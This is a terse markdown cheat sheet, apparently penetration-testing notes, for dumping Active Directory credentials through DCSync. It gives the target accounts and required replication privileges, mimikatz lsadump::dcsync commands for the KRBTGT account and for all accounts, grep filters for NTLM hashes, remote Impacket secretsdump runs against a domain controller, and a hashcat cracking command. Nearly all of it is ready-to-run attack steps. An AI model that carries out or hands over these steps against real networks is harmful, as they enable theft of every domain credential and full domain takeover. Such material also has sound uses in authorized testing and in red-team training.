# Credentials to look for:

### 1) Local admin rights on several machines

### 2) Service accounts that have delegate permissions

### 3) Accounts used for privileged AD Services (SCCM,WSUS,Exchange,etc.)

#### 1) mimikatz

#### 2) lsadump::dcsync /domain:DOMAIN /user:OUR_LOW-PRIVILEGE_AD_USERNAME

### Privileges: Replicate Directory Changes, Replicate Directory Changes All, Replicated Directory Changes in Filtered Set

### Usually, Administrators, Domain Admins and Enterprise Admins have this privilege in their accounts.

#### 1) mimikatz.exe

#### 2) privilege::debug

#### 3) lsadump::dcsync /user:KRBTGT_ACCOUNT

# DCSync every single account

#### 1) mimikatz

#### 2) log USERNAME_dcdump.txt

#### 3) lsadump::dcsync /domain:DOMAIN /all

#### 4) exit

#### 5) Download file

#### 6) cat FILE.txt | grep "SAM Username"

#### 7) cat FILE.txt | grep "Hash NTLM"

#### 8) Offline password cracking / Pass-theHash (Mimikatz)

# DCSync Remote

### Secretsdump.py on an account that is synced with the domain controller to dump hashes to PtH attack.

#### 1) python3 Impacket-Secretsdump.py -just-dc DOMAIN/AD_ADMIN_USER@DC_IP

#### 2) python3 Impacket-Secretsdump.py -just-dc-ntlm DOMAIN/AD_ADMIN_USER@DC_IP

#### 3) hashcat -m 1000 -a 0 hashes.txt /path/to/wordlist.txt
